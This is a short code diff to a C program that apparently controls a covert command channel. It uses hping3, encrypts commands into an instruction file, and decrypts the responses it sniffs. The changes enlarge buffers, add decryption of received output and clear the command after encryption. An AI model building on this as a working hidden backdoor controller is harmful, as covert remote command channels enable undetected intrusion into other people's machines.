@@ -29,9 +29,9 @@ int main(int argc, char *argv[]) {
     struct options_sniffer opts;
     struct sockaddr_in sniffer_addr, target_addr;
     socklen_t target_addr_len;
-    char buffer[1024] = {0};
+    char buffer[2048] = {0};
     int option = 1;
-    char hping3[64] = {0};
+    char hping3[128] = {0};
 
     check_root_user();
     options_sniffer_init(&opts);
@@ -76,6 +76,9 @@ int main(int argc, char *argv[]) {
         memset(buffer, 0, sizeof(buffer));
         recvfrom(opts.sniffer_socket, buffer, sizeof(buffer), 0,
                  (struct sockaddr *)&target_addr, &target_addr_len);
+        for (int i = 0; i < strlen(buffer); i++) {
+            buffer[i] = encrypt_decrypt(buffer[i]);
+        }
         printf("%s", buffer);
     }
 
@@ -125,7 +128,7 @@ void get_ip_address(struct options_sniffer *opts) {
 
 
 void get_instruction(struct options_sniffer *opts) {
-    char input[64] = {0};
+    char input[128] = {0};
     uint8_t input_length = 0;
 
     while(1) {
@@ -197,6 +200,7 @@ void encrypt_and_create_instruction_file(struct options_sniffer *opts) {
     fprintf(output, "%s", opts->encrypt_command);
     fclose(output);
     memset(opts->encrypt_command, 0, sizeof(opts->encrypt_command));
+    memset(opts->command, 0, sizeof(opts->command));
 }
 
 
